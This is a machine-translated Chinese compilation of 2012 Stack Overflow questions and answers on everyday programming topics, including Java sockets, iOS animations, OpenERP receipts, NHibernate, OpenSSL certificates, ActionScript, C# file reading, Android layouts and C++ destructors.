> 时间：2012-08-22T08:12:09.587
> 
> 标签：java, sockets, interface, bind

[http://docs.oracle.com/javase/tutorial/networking/nifs/definition.html](http://docs.oracle.com/javase/tutorial/networking/nifs/definition.html) 说“当您创建套接字并将其绑定到该地址时，系统使用关联的接口”。我试图在 Linux 和 Android 系统的页面上做这个例子，但是它在两者上都不起作用。绑定的 IP 地址在 IP 标头上设置为源 IP 地址，但传输接口仍然没有改变。许多人提到了 Stack Overflow 上的 URL。它真的那么有效吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:47:42.987

# objective-c - Xcode 使视图在单击时出现过渡

> ID：12068918
> 
> 赞同：3
> 
> 时间：2012-08-22T08:13:07.140
> 
> 标签：objective-c, ios, xcode, cocoa-touch

如果这似乎是一个基本问题，我很抱歉，但我的谷歌搜索技能似乎无法找到我的答案，我希望你能提供帮助！

基本上，我希望我的应用程序有一个按钮或一个标签，点击它会在其下方显示一些文本（以常见问题解答的形式，如这里的链接：http: [//aptow.com/faq](http://aptow.com/faq)）并推送所有内容放下它。我知道如何单击并显示以前隐藏的元素，但我不确定如何实现向下滑动的效果，同时在单击时将其他所有内容推到屏幕下方，然后重新一旦用户再次单击以重新隐藏以前隐藏的内容，将其安排在屏幕顶部附近。我给出的链接正是我想要做的。

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:40:14.333

正如@hermannKlecker 所说，您可以使用 animateWithDuration:animations 方法对块执行此操作：

```
[view animateWithDuration:duration animations:^{ //Block code here
/*set the new positions of the view either move up or down*/
}]; 
```

这段代码应该这样做。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:48:07.423

如果您想做类似于您发布链接的常见问题解答页面的操作，您可以使用 UITableView 使用动态单元格高度。

一个简单的 UITableViewController 可能如下所示：

```
#import "ViewController.h"

@interface ViewController () {
    NSArray *data;
    int selected;
}
@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.
    selected = -1;

    data = [NSArray arrayWithObjects:
                     [NSDictionary dictionaryWithObjectsAndKeys:@"Title 1", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 2", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 3", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 4", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 5", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 6", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],
                      [NSDictionary dictionaryWithObjectsAndKeys:@"Title 7", @"title", @"Lorem ipsum dolor bla blab bla", @"details", nil],nil ];

}

- (CGFloat)tableView:(UITableView *)tableView heightForRowAtIndexPath:(NSIndexPath *)indexPath {
    if (indexPath.row == selected) {
        return 130;
    } else
        return tableView.rowHeight;
}

- (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section {
    return [data count];
}

- (UITableViewCell *)tableView:(UITableView *)tableView cellForRowAtIndexPath:(NSIndexPath *)indexPath {
    static NSString *cellIdentifier = @"ci";
    UITableViewCell *cell = [tableView dequeueReusableCellWithIdentifier:cellIdentifier];
    if (!cell) {
        cell = [[UITableViewCell alloc] initWithStyle:UITableViewCellStyleDefault reuseIdentifier:cellIdentifier];
    }
    NSDictionary *tmp = [data objectAtIndex:indexPath.row];

    cell.textLabel.text = nil;

    static int TITLE_LABEL_TAG  = 122;
    UILabel *titleLabel = (UILabel *)[cell.contentView viewWithTag:TITLE_LABEL_TAG];
    if (!titleLabel) {
        titleLabel = [[UILabel alloc] initWithFrame:CGRectNull];
        titleLabel.tag = TITLE_LABEL_TAG;
        [cell.contentView addSubview:titleLabel];
        titleLabel.backgroundColor = [UIColor clearColor];
        titleLabel.numberOfLines = 1;
        titleLabel.font = [UIFont boldSystemFontOfSize:16];
        [cell.contentView addSubview:titleLabel];
    }
    titleLabel.frame = (CGRectMake(8, 8, cell.contentView.frame.size.width-16, 20));
    titleLabel.text = [tmp objectForKey:@"title"];

    static int DETAIL_LABEL_TAG  = 123;
    UILabel *detailLabel = (UILabel *)[cell.contentView viewWithTag:DETAIL_LABEL_TAG];
    if (!detailLabel) {
        detailLabel = [[UILabel alloc] initWithFrame:CGRectNull];
        detailLabel.tag = DETAIL_LABEL_TAG;
        [cell.contentView addSubview:detailLabel];
        detailLabel.backgroundColor = [UIColor clearColor];
        detailLabel.numberOfLines = 0;
    }
    if (indexPath.row == selected) {
        detailLabel.frame = (CGRectMake(8, 30, cell.contentView.frame.size.width-16, 100));

        detailLabel.hidden = NO;
        detailLabel.text = [tmp objectForKey:@"details"];
    } else {
        detailLabel.hidden = YES;
    }

    return cell;
}

- (void)tableView:(UITableView *)tableView didSelectRowAtIndexPath:(NSIndexPath *)indexPath {

    NSMutableArray *ip2reload = [NSMutableArray array];
    if (selected > -1 && selected != indexPath.row)
        [ip2reload addObject:[NSIndexPath indexPathForRow:selected inSection:0]];
    [ip2reload addObject:[NSIndexPath indexPathForRow:indexPath.row inSection:0]];
    selected = indexPath.row;
    [tableView reloadRowsAtIndexPaths:ip2reload withRowAnimation:UITableViewRowAnimationAutomatic];
}

@end 
```

您肯定必须根据内容计算所选行的实际行高（例如，如下所述：[Iphone - 当每个单元格高度为动态时，何时计算 tableview 的 heightForRowAtIndexPath？](https://stackoverflow.com/questions/4823197/iphone-when-to-calculate-heightforrowatindexpath-for-a-tableview-when-each-cel?lq=1)）。

您可以使用 scrollToRowAtIndexPath:atScrollPosition:animated 来确保所选单元格位于屏幕顶部。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:57:46.383

您可以通过为视图的 frame 属性设置动画来做到这一点。

使用[UIView （或](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIView_Class/UIView/UIView.html)[UITextView](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UITextView_Class/Reference/UITextView.html)等子类）初始化为适合其初始内容的帧高度（即标签，或者如果您使用单独的按钮或标签来切换可见性，则不使用任何内容）。

然后确定显示所需的扩展内容所需的帧高度，并将动画设置到这个新高度。下面的其他视图（如果有）也必须将其位置更改相同的数量。

举个例子：

```
[UIView beginAnimations:@"expand" context:nil];
[UIView setAnimationDuration:0.5];
[UIView setAnimationDelegate:self];
[myView setFrame:CGRectMake(myView.frame.origin.x, myView.frame.origin.y, myView.frame.size.width, expandedHeight)]; // set expandedHeight to the height you require
for (UIView *view in myViews) { // myViews is an array containing each view that can be expanded or moved.
    if (view.frame.origin.y > myView.frame.origin.y) // check if view is below the one to be expanded
        [view setFrame:CGRectMake(view.frame.origin.x, view.frame.origin.y + expandedHeight, view.frame.size.width, view.frame.size.height)]; // animate the move
}
[UIView commitAnimations]; 
```

还有各种其他方法可以为 UIView 及其子类的框架设置动画，请查看 Apples [UIView Reference](https://developer.apple.com/library/ios/#documentation/UIKit/Reference/UIView_Class/UIView/UIView.html)。

# openerp - 如何在收据中添加订单名称？

> ID：12068920
> 
> 赞同：4
> 
> 时间：2012-08-22T08:13:12.710
> 
> 标签：openerp

我使用的是 openerp 6.1.1，在 web 客户端中，pos 收据没有 pos 订单号。收据在模块的 pos.xml 中定义。如何在 pos 后端调用相同的收据，或者我如何添加订单号：在网络 pos 收据中？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-27T22:47:43.397

在文件的 pos-ticket 对象中，添加：

```
Order:<t t-esc="widget.currentOrder.getName()"/><br /> 
```

然后重新启动服务器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-05T08:04:02.400

从 Openerp 论坛我找到了答案。只需添加以下内容。pos.xml 中的代码。

```
<t t-esc="widget.currentOrder.getName()"/><br /> 
```

在下面

```
 <t t-name="pos-ticket">
    <div class="pos-sale-ticket">
    <div class="pos-right-align"><t t-esc="new Datee().toString(Date.CultureInfo.formatPatterns.shortDate + ' ' +
Date.CultureInfo.formatPatterns.longTime)"/></div>
    <br />
    <t t-esc="widget.company.name"/><br />
    Phone: <t t-esc="widget.company.phone || ''"/><br />
    User: <t t-esc="widget.user.name"/><br />
    Shop: <t t-esc="widget.shop_obj.name"/><br /> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-03-31T10:49:18.830

对于 odoo8，正确的行是：`<t t-esc="widget.pos.get_client().name" />`

# asp.net-mvc - 错误消息不在开发中，而是在使用 NHibernate 版本 2.1.1.4000 的部署中

> ID：12068925
> 
> 赞同：0
> 
> 时间：2012-08-22T08:13:50.027
> 
> 标签：asp.net-mvc, nhibernate

我看过

[无法加载类型“NHibernate.ByteCode.Castle.ProxyFactoryFactory，NHibernate.ByteCode.Castle”](https://stackoverflow.com/questions/3971544/unable-to-load-type-nhibernate-bytecode-castle-proxyfactoryfactory-nhibernate)

在部署后运行单元测试时，我也有相同的错误消息，但是我的应用程序运行良好。即使在开发过程中，我也没有任何此类错误。

怎么了？为什么在运行单元测试时出现此错误消息？

错误信息如下：

NHibernate.Bytecode.ProxyFactoryFactoryNotConfiguredException ：未配置 ProxyFactoryFactory。使用可用的 NHibernate.ByteCode 提供程序之一初始化会话工厂配置部分的“proxyfactory.factory_class”属性。示例：NHibernate.ByteCode.LinFu.ProxyFactoryFactory、NHibernate.ByteCode.LinFu 示例：NHibernate.ByteCode.Castle.ProxyFactoryFactory、NHibernate.ByteCode.Castle ]]> - -

]]>

连接字符串是 web.config

```
> > <hibernate-configuration xmlns="urn:nhibernate-configuration-2.2">
>     <session-factory>
>       <property name="dialect">NHibernate.Dialect.MsSql2000Dialect</property>
>       <property name="connection.provider">NHibernate.Connection.DriverConnectionProvider</property>
>       <property name="connection.connection_string">Server=localhost\SQLServer2005;Database=testDev;</property>
>       <property name='proxyfactory.factory_class'>NHibernate.ByteCode.Castle.ProxyFactoryFactory,
> NHibernate.ByteCode.Castle</property>
>     </session-factory>   </hibernate-configuration> 
```

dll是：

我有 NHIbernate 版本 2.1.1.4000，我有 NHibernate.ByteCode.Castle 版本 2.1.1.4000，Castle.Core 1.1.0，Castle.DynamicProxy2.dll 版本 2.1.1.0

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T09:03:43.550

您使用的是哪个版本的 NHibernate？3.2 版预配置了代理工厂。如果您使用此版本，则不再需要 proxyfactory.factory_class 配置选项。

此外，如果您的测试失败但您的应用程序没有失败，那么测试可能无法访问正确的休眠配置文件。如果您正在以编程方式进行配置，请再次查看以验证是否设置了代理因子（如果使用 NH < 3.2）或未设置（如果使用 NH >= 3.2）...

# apache - Apache，为 IP 地址创建 SSL 证书

> ID：12068928
> 
> 赞同：0
> 
> 时间：2012-08-22T08:14:02.923
> 
> 标签：apache, ip, ssl-certificate

我实际上正在尝试为我的网络服务器创建一个测试 ssl 证书。我从[本教程](http://onlamp.com/onlamp/2008/03/04/step-by-step-configuring-ssl-under-apache.html)开始。

但是当我尝试使用以下命令创建证书时：

```
openssl req -new -x509 -days 365 -sha1 -newkey rsa:1024 -nodes -keyout server.key -out server.crt -subj '/O=Company/OU=Department/CN=www.10.9.11.99/lebenmittel_test' 
```

出现以下错误：

```
Generating a 1024 bit RSA private key
..............++++++
.................................++++++
writing new private key to 'server.key'
-----
end of string encountered while processing type of subject name element #3
problems making Certificate Request 
```

我认为问题在于，我正在尝试为 IP 地址创建证书...：/我尝试了与 www.example.com 相同的命令并且它有效。

有没有办法为 IP 地址创建证书？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T08:55:47.773

您的问题是 'lebenmittel_test' 不是有效的属性语法。此外，'CN=www.10.9.11.99' 对于 CN 来说绝对是狡猾的。

为什么不直接为 CN 分配一个有效的名称，然后调整您的 /etc/hosts 文件以使用该名称指向 IP 地址？

# actionscript-3 - 在 ActionScript 3的 htmlText 标记中使用库中的符号

> ID：12068933
> 
> 赞同：0
> 
> 时间：2012-08-22T08:14:14.700
> 
> 标签：actionscript-3, flash, image, htmltext

问题是这样的：我需要使用 img 标签将图像添加到 textField，但我无法从我的 swf 文件中的库中引用符号。

```
txt.htmlText =  "test <img src='symbol1' height='10' width='10' align='right'/>"; 
```

此符号的 AS 链接是 symbol1，我尝试将此 swf 嵌入我的班级，但它总是给出错误 #2035 - URL not found

Adobe 说 img 标签接受库符号，但我找不到任何例子证明这是真的。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:42:11.407

自从我这样做以来已经有一段时间了，但我认为您需要在库中创建一个包含位图的影片剪辑，然后将其导出为 ActionScript，然后将其添加为标签中的链接。

因此，如果您的 movieClip 导出为“myImage_mc”，您的 html 将是：

```
<img src="myImage_mc" width="100" height ="100"/> 
```

**更新。**

为了澄清，这是我在图书馆中的符号：

![图书馆符号](../Images/3c5ff498dfa3de779a8d77d9e3cf9139.png)

这是我的动作脚本：

```
import flash.text.TextField;

var textField:TextField = new TextField();
textField.htmlText = "<p>HKP</p><img src='HKP'/>";
textField.x = textField.y = 100;
stage.addChild(textField); 
```

这是结果（诚然需要一些调整）：

![输出](../Images/817fd96d0eea2aab1e3a1b761eeb11c6.png)

**注意：如果 img 是该字段中唯一的标签，这似乎不起作用。您必须添加一些文本，即使它不可见。空的 P 不起作用，因此其中任何一个都将失败：**

```
textField.htmlText = "<img src='HKP'/>";
textField.htmlText = "<p></p><img src='HKP'/>"; 
```

...但这有效：

```
textField.htmlText = "<p> </p><img src='HKP'/>"; 
```

...这几乎是一个经典的 Adob​​e 陷阱；）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-04T15:28:01.593

对于您的来源，请尝试添加图像扩展名，例如 image.jpg 或 image.png

textfield.htmlText = " `<img src='image_name.jpg' width='100' height='100'/>`";

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-08-07T14:21:51.020

```
//Displays img on stage. No text is necessary
var txt:TextField = new TextField ();
txt.wordWrap = true;//this is necessary or img won't display
txt.width = 400;//size up to avoid cutting off image
txt.height = 200;//this doesn't affect the image size or proportion
txt.htmlText = '<img src="yourimage.png" />';
addChild(txt); 
```

# c# - 在 C# 中高效读取超大文件。当前使用 StreamReader

> ID：12068934
> 
> 赞同：2
> 
> 时间：2012-08-22T08:14:19.057
> 
> 标签：c#

我有一个大小为 50GB 及以上的 Json 文件。以下是我为阅读一小部分 Json 所写的内容。我现在需要修改它来读取大文件。

```
internal static IEnumerable<T> ReadJson<T>(string filePath)
{
    DataContractJsonSerializer ser = new DataContractJsonSerializer(typeof(T));
    using (StreamReader sr = new StreamReader(filePath))
    {
        String line;
        // Read and display lines from the file until the end of
        // the file is reached.
        while ((line = sr.ReadLine()) != null)
        {
            byte[] jsonBytes = Encoding.UTF8.GetBytes(line);
            XmlDictionaryReader jsonReader = JsonReaderWriterFactory.CreateJsonReader(jsonBytes, XmlDictionaryReaderQuotas.Max);
            var myPerson = ser.ReadObject(jsonReader);
            jsonReader.Close();

            yield return (T)myPerson;
        }
    }
} 
```

1.  如果我在当前代码中构造 StreamReader 时指定缓冲区大小就足够了吗？
2.  如果我在这里错了，请纠正我。缓冲区大小基本上指定了一次从磁盘读取多少数据到内存。因此，如果文件大小为 100MB，缓冲区大小为 5MB，它一次读取 5MB 到内存，直到读取整个文件。
3.  假设我对第 3 点的理解是正确的，那么对于如此大的文本文件，理想的缓冲区大小是多少？int.Max size 会是个坏主意吗？在 64 位 PC 中，int.Max 大小为 2147483647。我假设缓冲区大小以字节为单位，计算结果约为 2GB。这本身可能会消耗时间。我正在寻找像 100MB - 300MB 这样的缓冲区大小。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T08:18:48.753

它将一次读取一行（输入文件），可能是 10 个字节，也可能是全部 50GB。所以归结为：输入文件的结构如何？如果输入 JSON 在对象之间的中断处有换行符*，*那么这可能会变得很糟糕。

缓冲区大小可能会影响它**在查找**每行末尾时的读取量，但最终：它需要每次都找到一个换行符（至少，它当前是如何写入的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T08:34:26.877

我认为您应该先比较不同的解析器，然后再担心缓冲区大小的细节。[DataContractJsonSerializer、 Raven JSON](https://github.com/ravendb/Raven.Json)或[Newtonsoft JSON](http://json.codeplex.com/)
之间的差异将非常显着。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T08:38:40.017

因此，您的主要问题是您的界限在哪里，并且鉴于您的文档是 JSON 文档，在我看来，您的界限很可能是类，我假设（或希望）您没有 1 个大喇叭50GB 的类。我还假设您实际上并不需要内存中的所有这些类，但您可能需要搜索整个内容以查找您的子集……这听起来大致正确吗？如果是这样，我认为您的伪代码类似于

```
using a Json parser that accepts a streamreader (newtonsoft?)
read and parse until eof
  yield return your parsed class that matches criteria
  read and parse next class
end 
```

# android - 在eclipse中设置Android系统应用

> ID：12068935
> 
> 赞同：2
> 
> 时间：2012-08-22T08:14:21.303
> 
> 标签：android, eclipse, android-emulator

我已经下载了一个 Android`system application`源代码。

当我在 Eclipse 中导入项目并尝试在模拟器中运行它时，它会显示`signature error`. 我认为这是因为清单中的包名被认为与手机中已经安装的任何应用程序不同，但是当我尝试更改清单文件中的包名时，自动生成的 R.java 文件被删除。

现在我的问题是

1.  如何避免此签名不匹配错误？

2.  如何修改清单文件中的包名称，以免 R.java 文件被删除？

或者我怎样才能简单地从 Eclipse 中获取 android System 应用程序？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T08:18:49.547

为什么不尝试重新创建整个 Android 应用程序？我的意思是，既然你下载了它，只需创建一个新的空白 android 应用程序并创建必要的类、xmls、更改清单文件并复制你拥有的代码并将其粘贴到新的代码中。有了这个，您将能够一一看到代码是如何工作的，并按照您创建它的方式对其进行调试。希望这会有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T08:23:23.100

要进行系统应用，您的应用程序必须具有与真实设备匹配的产品签名密钥（签名）。该密钥位于 \build\target\product\security\

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T08:24:29.140

引用自[https://stackoverflow.com/a/9645224/1163019](https://stackoverflow.com/a/9645224/1163019)

“如果你想要一个签名或系统权限，你只需要放在系统映像上；你不需要用任何特殊的证书签名。你可以像这样一次性完成（直到你退出模拟器） :"

```
> adb root
> adb remount
> adb push /path/to/My.apk /system/app/My.apk 
```

您可以使用“Android 工具”在 Eclipse 中更新包名称。右键单击项目，选择“Android 工具”下的“重命名应用程序包”。那应该根据需要重构代码。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-24T06:29:23.420

好吧，我已经想通了。

这是`signature error`因为清单文件中的包名称`com.android.inputmethods.latin`与已安装的 android 的默认 Android 键盘匹配。所以我需要更改清单文件中的包名。我改变了那个，但是又出现了一个新问题，`R.java`文件被自动删除了。

发生这种情况是因为，当我更改包名称时，我需要在一些 XML 文件中更新它。从逻辑上讲，直到我这样做之前，XML 文件中存在一些错误。

**And the `R.java` file is generated automatically when there's no error in XML files.** So when I updated the XML files & fixed the error in there, R.java file generated automatically.

Hope this helps someone :)

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-14T11:55:56.853

```
adb push myApk.apk /system/app 
```

# php - 如何检测用户访问的链接是否符合我们的规则？

> ID：12068938
> 
> 赞同：0
> 
> 时间：2012-08-22T08:14:30.087
> 
> 标签：php

例子：

我有一个网页 abc.com/index.php

我想检测用户是否连接到**abc.com/index.php/bbdh**、 **abc.com/index.php/bb/saggfd/gjasgd/hsahgd**、**abc.com/index.php/bb/saggfd/gjas**等等在我的主机上没有这样的页面。

我正在使用 php 并且需要一些方法来做到这一点而不使用 .htaccess 文件。谢谢你的帮助！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:23:22.323

看看`$_SERVER['REQUEST_URI']`，你需要的每样东西都可以在这里找到。例如：

```
abc.com/index.php/bb/saggfd/gjas 
```

这将是：

```
/index.php/bb/saggfd/gjas 
```

剥离类似的`/index.php`东西：

```
echo substr($_SERVER['REQUEST_URI'], strlen($_SERVER['SCRIPT_NAME'])); 
```

你已经准备好了。

* * *

**关于如何处理 GET 参数的**更新：****

 **```
// get the full request uri
$requestUri = substr($_SERVER['REQUEST_URI'], strlen($_SERVER['SCRIPT_NAME']));

// let php parse that url (though it's just a part of the full url)
$chunks = parse_url($requestUri);

// let php parse the query string
parse_str(isset($chunks['query']) ? $chunks['query'] : '', $chunks['query']);

// debug output
print_r($chunks); 
```**

# jquery - 刷新时禁用 jQuery 对话框

> ID：12068940
> 
> 赞同：0
> 
> 时间：2012-08-22T08:14:34.360
> 
> 标签：jquery, jquery-ui, jquery-ui-dialog, page-refresh

我有一个 jQuery 对话框设置为`autoOpen:true`.

因此它会在页面加载时弹出。包含两个`dialog`按钮

一个关闭它，另一个打开一个`form`，

，当我提交表单时，我设置了重定向到同一页面。

我宁愿这个“对话框”在重定向（某种刷新）发生时不再出现。

我试过使用`$_SERVER['HTTP_REFERER']`和`$_SERVER['REQUEST_URI']`如下：

```
 var ref_url = $('#referring_url').val();
   var cur_url = $('#current_url').val();
   var refresher = true;

   if(ref_url = cur_url)
      refresher = false;
   else
      refresher = true; 
```

我已将`dialog` `autoOpen`值设置为`refresher`

然后从 php 解析 uri 值，我使用了下面的隐藏输入框：

```
<input id="referring_url" name="referring_url" id="referring_url" type="hidden" value="<?php echo $_SERVER['HTTP_REFERER']; ?>" />

<input id="current_url" name="current_url" id="current_url" type="hidden" value="<?php echo $_SERVER['REQUEST_URI']; ?>" /> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T08:17:40.730

您在 if 表达式中使用赋值。

`if(ref_url = cur_url){`这个声明应该是`if(ref_url == cur_url){`

# android-layout - 在运行时获取布局高度和宽度android

> ID：12068945
> 
> 赞同：21
> 
> 时间：2012-08-22T08:14:59.603
> 
> 标签：android-layout

如何获取在 xml 中定义为高度和宽度的 fill_parent 的线性布局的宽度和高度？我已经尝试过 onmeasure 方法，但我不知道为什么它没有给出确切的值。在 oncreate 方法完成之前，我需要在 Activity 中使用这些值。

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2012-08-31T09:15:54.200

假设我必须获得`LinearLayout`在 XML 中定义的宽度。我必须通过 XML 获得它的参考。定义`LinearLayout` `l`为实例。

```
 l = (LinearLayout)findviewbyid(R.id.l1);
ViewTreeObserver observer = l.getViewTreeObserver();
        observer.addOnGlobalLayoutListener(new OnGlobalLayoutListener() {

            @Override
            public void onGlobalLayout() {
                // TODO Auto-generated method stub
                init();
            l.getViewTreeObserver().removeGlobalOnLayoutListener(
                    this);
        }
    });

protected void init() {
        int a= l.getHeight();
            int b = l.getWidth();
Toast.makeText(getActivity,""+a+" "+b,3000).show();
    } 
    callfragment();
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-22T08:48:47.057

宽度和高度值是在创建布局后设置的，当放置元素时，它们会被测量。在第一次调用 onSizeChanged 时，参数将为 0，因此如果您使用该检查来检查它。

更多细节在这里 [https://groups.google.com/forum/?fromgroups=#!topic/android-developers/nNEp6xBnPiw](https://groups.google.com/forum/?fromgroups=#!topic/android-developers/nNEp6xBnPiw)

在这里[http://developer.android.com/reference/android/view/View.html#Layout](http://developer.android.com/reference/android/view/View.html#Layout)

以下是如何使用 onLayout：

```
@Override
protected void onLayout(boolean changed, int l, int t, int r, int b) {
    int width = someView.getWidth();
    int height = someView.getHeight();
} 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-08-20T14:20:02.633

要使其工作，您需要检查所需的高度值是否大于 0 - 然后首先删除 onGlobalLayout 侦听器并对高度执行任何您想要的操作。侦听器连续调用它的方法，并且在第一次调用时不能保证正确测量视图。

```
 final LinearLayout parent = (LinearLayout) findViewById(R.id.parentView);
    parent.getViewTreeObserver().addOnGlobalLayoutListener(new ViewTreeObserver.OnGlobalLayoutListener() {
        @Override
        public void onGlobalLayout() {
            int availableHeight = parent.getMeasuredHeight();
            if(availableHeight>0) {
                parent.getViewTreeObserver().removeGlobalOnLayoutListener(this);
                //save height here and do whatever you want with it
            }
        }
    }); 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2015-08-10T22:59:35.040

您可以在布局中添加布局更改侦听器并获取最新的高度和宽度，甚至是上次更改之前的高度和宽度。

> 在 API 级别 11 中添加
> 
> 添加一个侦听器，当视图的边界由于布局处理而发生变化时将调用该侦听器。

```
LinearLayout myLinearLayout = (LinearLayout) findViewById(R.id.my_linear_layout);
myLinearLayout.addOnLayoutChangeListener(new View.OnLayoutChangeListener() {
        @Override
        public void onLayoutChange(View v, int left, int top, int right, int bottom, int oldLeft, int oldTop, int oldRight, int oldBottom) {
            // Preventing extra work because method will be called many times.
            if(height == (bottom - top))
                return;

            height = (bottom - top);
            // do something here...
           }
     }); 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-10-05T12:41:18.850

基于 MGDroid 对 API 16+ 的回答使用 Kotlin 的通用方法。

```
/**
 * Align height of a container from wrap-content to actual height at runtime.
 * */
private fun <T: ViewGroup> alignContainerHeight(container: T) {
    container.viewTreeObserver.addOnGlobalLayoutListener(object : ViewTreeObserver.OnGlobalLayoutListener {
        override fun onGlobalLayout() {

            // Obtain runtime height
            val availableHeight = container.measuredHeight

            if (availableHeight > 0) {
                container.viewTreeObserver.removeOnGlobalLayoutListener(this)
                setContainerHeight(container, availableHeight)
            }
        }
    })
}

/**
 * Note: Assumes that the parent is a LinearLayout.
 * */
private fun <T : ViewGroup> setContainerHeight(container: T, availableHeight: Int) {
    val availableWidth = container.measuredWidth
    val params = LinearLayout.LayoutParams(availableWidth, availableHeight)

    // Note: getLayoutParams() returns null if no parent exists
    if (container.layoutParams != null) {
        container.layoutParams = params
    }
} 
```

# sorting - 我应该如何对对象进行排序？通过着色器还是通过网格？

> ID：12068948
> 
> 赞同：2
> 
> 时间：2012-08-22T08:15:14.800
> 
> 标签：sorting, opengl-es, drawing

为了尽量减少状态变化的数量，我应该对网格的绘制顺序进行排序。无论如何，如果我有多个使用多个着色器的网格，我需要选择按顶点属性绑定或着色器统一参数之一进行排序。

我应该选择什么？我认为由于 GPU 缓存命中率，我必须选择最小化顶点属性更改，但我不知道着色器更改成本。决定绘图顺序时的一般关注点是什么？我可以得到一些基础来选择这个吗？

PS。我的目标是 iOS/PowerVR SGX 芯片。

## 编辑

我决定按材质排序，因为许多网格将只使用几种材质，但有一堆网格要绘制。这意味着我将有更多机会共享材质而不是共享网格。因此它将有更多机会减少状态更改计数。反正我不确定，所以如果你有更好的意见，请告诉我。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T13:12:54.823

您不需要在 PowerVR SGX 上对不透明对象进行深度排序，因为它使用了与顺序无关的、像素完美的隐藏表面去除。深度排序仅用于实现适当的透明度/半透明渲染。

新交所的最佳实践是按状态排序，顺序如下：

*   视口
*   帧缓冲区
*   着色器
*   纹理
*   剪辑、混合等

使用纹理图集可以显着减少纹理状态变化。通过批处理可以减少绘制调用的数量。

这只是黄金法则，记住你应该先分析然后优化:)

请参阅： [http ://www.imgtec.com/powervr/insider/docs/PowerVR.Performance%20Recommendations.1.0.28.External.pdf](http://www.imgtec.com/powervr/insider/docs/PowerVR.Performance%20Recommendations.1.0.28.External.pdf)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T12:32:57.773

使用类似[http://realtimecollisiondetection.net/blog/?p=86](http://realtimecollisiondetection.net/blog/?p=86)的东西，然后您可以在运行时更改代码中首先排序的部分，以实现每台设备的最佳速度

# c++ - 带有向量、指针的 C++ 析构函数，

> ID：12068950
> 
> 赞同：47
> 
> 时间：2012-08-22T08:15:39.243
> 
> 标签：c++, destructor

据我所知，我应该在析构函数中销毁我创建的所有内容，`new`并关闭打开的文件流和其他流。但是，我对 C++ 中的其他对象有一些疑问：

*   `std::vector`和`std::string`s：它们会自动销毁吗？

*   如果我有类似的东西

    ```
    std::vector<myClass*> 
    ```

    指向类的指针。调用向量析构函数时会发生什么？
    它会自动调用 的析构函数`myClass`吗？或者只有向量被破坏，但它包含的所有对象仍然存在于内存中？

*   如果我在一个类中有一个指向另一个类的指针会发生什么，比如：

    ```
    class A {
      ClassB* B;
    } 
    ```

    并且 A 类在代码中的某个点被销毁。B 类也会被销毁，还是指针和 B 类仍然存在于内存中的某个地方？

* * *

## 回答 #1

> 赞同：52
> 
> 时间：2012-08-22T08:18:54.787

> std::vector 和 std::strings：它们会自动销毁吗？

是的（假设成员变量不是指向`std::vector`and的指针`std::string`）。

> 如果我有类似 std::vector 的东西，当调用向量析构函数时会发生什么？它会自动调用 myClass 的析构函数吗？或者只有向量被破坏，但它包含的所有对象仍然存在于内存中？

如果`vector<MyClass>`那么包含在向量中的所有对象都将被销毁。如果`vector<MyClass*>`那么所有对象都必须显式地`delete`d （假设被破坏的类拥有 中的对象`vector`）。第三种选择是`vector`智能指针，例如，在这种情况下，不需要明确地d`vector<shared_ptr<MyClass>>`的元素。`vector``delete`

> 如果我在一个类中有一个指向另一个类的指针会发生什么

`B`必须明确`delete`d . 同样，可以使用智能指针来处理`B`.

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-08-22T08:26:04.027

您只需要担心您动态创建的内存（当您使用`new`. 保留内存时）

例如：

```
Class Myclass{
   private:
       char* ptr;
   public:
       ~Myclass() {delete[] ptr;};
} 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-22T08:19:25.990

